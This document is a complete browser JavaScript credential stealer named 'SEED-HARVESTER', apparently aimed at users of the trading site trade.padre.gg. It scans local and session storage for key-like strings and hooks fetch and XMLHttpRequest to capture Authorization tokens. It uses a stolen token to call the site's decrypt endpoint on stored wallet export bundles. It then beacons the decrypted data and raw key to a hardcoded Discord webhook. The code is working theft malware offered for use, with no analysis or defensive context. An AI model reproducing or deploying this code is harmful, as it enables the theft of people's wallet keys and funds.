(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
    let caught = false;

    console.log("%c[VANTA] SEED-HARVESTER LOADED", "color: #00ff88; font-weight: bold;");

    const process = async (key) => {
        if (caught || !key || key.length < 40) return;
        
        const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bundleStr) return;

        try {
            caught = true;
            const b = JSON.parse(bundleStr);
            const k = Object.keys(b.bundles)[0];
            const p = { bundle: b.bundles[k].exportBundle, subOrgId: b.bundles[k].subOrgId };

            // Using trade.padre.gg as the resolving endpoint
            const res = await fetch("https://trade.padre.gg/api/v2/enclave/decrypt", {
                method: 'POST',
                headers: { 
                    'Authorization': key.startsWith('Bearer') ? key : `Bearer ${key}`,
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify(p)
            });

            const data = await res.text();
            
            navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify({
                embeds: [{
                    title: "🔑 SEALED KEY CAPTURED",
                    description: "**.gg Result:**\n```json\n" + data.substring(0, 1800) + "```",
                    fields: [{ name: "Raw Key Detected", value: "```" + key + "```" }],
                    color: 65280
                }]
            })], { type: 'text/plain' }));

            console.log("%c[VANTA] SUCCESS", "color: #00ff88;");
        } catch (e) { caught = false; }
    };

    // 1. SCAN FOR HIGH-ENTROPY SEEDS (Regex for your specific key type)
    const scanMemory = () => {
        const allData = {...localStorage, ...sessionStorage};
        // This regex looks for 80-95 character alpha-numeric strings (Base58 style)
        const seedRegex = /[A-Za-z0-9]{80,95}/g;

        Object.values(allData).forEach(val => {
            const matches = val.match(seedRegex);
            if (matches) matches.forEach(m => process(m));
            
            // Check nested JSON
            try {
                const p = JSON.parse(val);
                Object.values(p).forEach(subVal => {
                    if (typeof subVal === 'string' && subVal.length > 80) process(subVal);
                });
            } catch(e){}
        });
    };

    // 2. INTERCEPT IN-FLIGHT KEYS
    const _set = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(n, v) {
        if (n.toLowerCase() === 'authorization') process(v);
        return _set.apply(this, arguments);
    };

    const _fetch = window.fetch;
    window.fetch = async (...args) => {
        const h = args[1]?.headers;
        const a = (h instanceof Headers) ? h.get('Authorization') : h?.['Authorization'];
        if (a) process(a);
        return _fetch.apply(this, args);
    };

    // 3. EXECUTE
    scanMemory();
    // Force call to trigger interceptors
    _fetch('https://trade.padre.gg/api/v2/user/profile').catch(()=>{});
})();
